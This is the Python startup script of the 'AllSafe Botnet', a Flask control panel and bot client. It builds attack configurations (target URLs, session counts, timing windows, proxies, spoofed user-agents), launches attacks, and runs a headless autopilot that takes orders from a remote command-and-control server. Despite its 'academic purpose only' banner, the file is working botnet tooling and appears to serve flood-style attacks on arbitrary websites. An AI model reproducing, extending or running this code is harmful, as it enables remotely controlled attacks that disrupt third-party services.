#!/usr/bin/python3
"""
This is the startup script for the botnet. Please note that the software is developed under.
Python 3.4.x version of the interpreter.

Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
Version:    0.1.0
Created:    24 October 2016
Modified:   16 February 2017
"""

from flask import Flask
from flask import render_template
from flask import request
from flask import abort
from flask import redirect

from time import time
import sys

import requests
from requests.auth import HTTPBasicAuth

import json
import Botnet

from collections import OrderedDict
from utils.config import rootSchema, targetSchema, requestSchema


app = Flask(__name__)

allsafe = Botnet.AllSafeBotnet()

"""
The Botnet will use a simple implementation of a micro WebServer using Flask

It will receive HTTP request in both GET and POST method on the root page.

If the method is POST, a login request is assumed and the login process will be performed;
if the process fails an error message will be returned; if it will succed the amdin page will be returned.

If the method is GET, the login form will be shown.
"""
@app.route("/", methods=['GET', 'POST'])
def showControlPage():
    return render_template("localcontrolpage.html")


@app.route("/abort", methods=['GET','POST'])
def abort():
    try:
        allsafe.abort()
    except Exception as e:
        print(str(e))
        return "Internal Server Error", 500
    return "OK", 200


@app.route("/getconfig", methods=['GET'])
def getConfig():
    file = open("./data/current_attack.json","r")
    text = file.read()
    file.close()
    return json.dumps(json.loads(text), indent=4)


"""
In the controlpage you can submit a new request of two different type: upload or attack.

Upload has not subtypes. It only allows to prepare the configuration file that will be used
to performa local or a remote attack using the json file given as example.

Attack has two subtypes: local or remote. The former will use the AllSafeBotnet class (defined in Worker.py) to carry
the attack using the override parameter set to True, while the latter will use the same method with the override param
set to False.
"""
@app.route("/submit", methods=['POST'])
def performAttack():
    # if not autopilot mode, we will experience a step-by-step attack session
    # let we check for configuration file formatting...
    try:
        # retrieving and polishing C&C server and prepare config file
        if 'autopilot_start' in request.json:
            server = request.json['cc_server_auto']
            if "http://" not in server:
                server = "http://" + server
            allsafe.autopilot(server, {}, int(request.json['contact_time']), override=False)
            return "OK", 200

        # prepare configuration
        prepareConfigFile(request.json)
        config_path = './data/current_attack.json'
        # prepare botnet resources
        # the attack will be carried
        allsafe.attack(config_path, override=True)
        # return success
        return "OK", 200
    except Exception as e:
        return "Invalid request", 402

def prepareConfigFile(params, where='./data/current_attack.json'):

    localRootSchema = dict()

    # Only the useful key values will be changed accordingly
    localRootSchema['last_modified'] = round(time())
    localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""
    localRootSchema['log_file'] = params['log_file'] if 'log_file' in params else "./data/log.txt"
    localRootSchema['user-agent_b'] = params['user_agent'] if 'user_agent' in params else ""
    localRootSchema['targets'] = []

    # Creation of the requestSchema
    for elem in params['target']:
        # Creation of the locaTargetSchema based upon the TargetSchema
        localTargetSchema = dict()
        localTargetSchema['sessions'] = int(elem['sessions']) if 'sessions' in elem else 1
        localTargetSchema['max_count'] = int(elem['max_count']) if 'max_count' in elem else 15

        if elem['min_period'] == "" or elem['max_period'] == "":
            localTargetSchema['period'] = ""
        else:
            localTargetSchema['period'] = elem['min_period'] + "-" + elem['max_period']

        # Creation of the actionCondition dictionary
        actionConditions = OrderedDict()

        # If AMPM has been choosen both AM and PM will be set on 1
        ampm = elem['AMPM'] if 'AMPM' in elem else ""
        if ampm == "AM":
            actionConditions['AM'] = 1
            actionConditions['PM'] = 0
        if ampm == "PM":
            actionConditions['AM'] = 0
            actionConditions['PM'] = 1
        if ampm == "AMPM":
            actionConditions['AM'] = 1
            actionConditions['PM'] = 1
        if elem['hour_start'] == "" or elem['hour_end'] == "":
            actionConditions['attack_time'] = ""
        else:
            actionConditions['attack_time'] = elem['hour_start'] + "-" + elem['hour_end']

        if 'avoid_month' in elem:
            if isinstance(elem['avoid_month'],list):
                actionConditions['avoid_month'] = elem['avoid_month']
            else:
                actionConditions['avoid_month'] = [elem['avoid_month']]
        else:
            actionConditions['avoid_month'] = []

        if 'avoid_week' in elem:
            if isinstance(elem['avoid_week'],list):
                actionConditions['avoid_week'] = elem['avoid_week']
            else:
                actionConditions['avoid_week'] = [elem['avoid_week']]
        else:
            actionConditions['avoid_week'] = []


        # ActionConditions is now part of the localTargetSchema
        localTargetSchema['action_conditions'] = actionConditions

        localRequestSchema = dict()
        localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
        localRequestSchema['url'] = elem['url'] if 'url' in elem else ""
        localRequestSchema['user-agent'] = params['user_agent'] if 'user_agent' in params else ""
        localRequestSchema['timeout'] = float(elem['timeout']) if 'timeout' in elem else 0.5

        if 'resources' in elem:
            if isinstance(elem['resources'],list):
                for res in elem['resources']:
                    if res[0] != "/":
                        res = "/" + res
                localRequestSchema['resources'] = elem['resources']
            else:
                if elem['resources'][0] != "/":
                    elem['resources'] = "/" + elem['resources']
                localRequestSchema['resources'] = [elem['resources']]
        else:
            localRequestSchema['resources'] = ["/"]

        localRequestSchema['encoding'] = elem['encoding'] if 'encoding' in elem else ""

        # Creation of the proxy dictionary
        proxy = OrderedDict()

        # If an element has been specified as https, it will be handeld properly
        if ('proxy' in elem):
            for proxy_elem in elem['proxy']:
                if "https://" in proxy_elem:
                    proxy['https'] = proxy_elem
                else:
                    proxy['http'] = proxy_elem
        else:
            proxy['https'] = ''
            proxy['http'] = ''

        # Proxy is now part of localRequestSchema
        localRequestSchema['proxy_server'] = proxy

        # Final combination of the three schemas
        localTargetSchema['request_params'] = localRequestSchema
        localRootSchema['targets'].append(localTargetSchema)

    #The json configuration will be written
    file = open(where, "w")
    file.write(json.dumps(localRootSchema,indent=4))
    file.close()
    return


if __name__ == "__main__":
    print("-------------------------------------------------------------")
    print("            ALLSAFE BOTNET - Academic purpose only           ")
    print("                          v. 0.1.0                           ")
    print("\nDeveloped with no harmful intentions and love by:          ")
    print("  - Alessio 'Tyrell' Moretti                                 ")
    print("  - Federico 'Elliot' Vagnoni                                ")
    print("-------------------------------------------------------------")
    
    if len(sys.argv) == 1:
        app.run(threaded=True, host='0.0.0.0', port=4042)

    # check for command line headless mode arguments 
    for argument in sys.argv:
        # presetting autopilot timer 
        autopilot_timer = 5

        if '--timer' in argument:
            try:
                autopilot_timer = argument.split("=")[1]
                autopilot_timer = int(autopilot_timer)
                if autopilot_timer < 0:
                    autopilot_timer = 0
            except Exception:
                print("Error entering autopilot mode - timer was invalid")
                sys.exit()

        elif '--help' in argument:
            print("Usage: python3 __init__.py [--OPTION=value]")
            print(" --remote=<remote address for c&c server>")
            print(" --config=<configuration file complete path>")
            print(" --timer=<integer between each update request to C&C")
            sys.exit()

        if '--remote' in argument:
            try:
                cc_server = argument.split("=")[1]
                print("- botnet C&C located at:", cc_server)
                allsafe = Botnet.AllSafeBotnet()
                allsafe.autopilot(cc_server, "", autopilot_timer, override=False)
            except Exception:
                print("Error entering autopilot mode - invalid remote address")
                sys.exit()

        elif '--config' in argument:
            try:
                configuration = sys.argv[sys.argv.index('--config') + 1]
                print("- botnet client configuration at:", configuration)
                allsafe.autopilot("", configuration, autopilot_timer, override=True)
            except Exception:
                print('Error entering autopilot mode - local configuration')
                sys.exit()
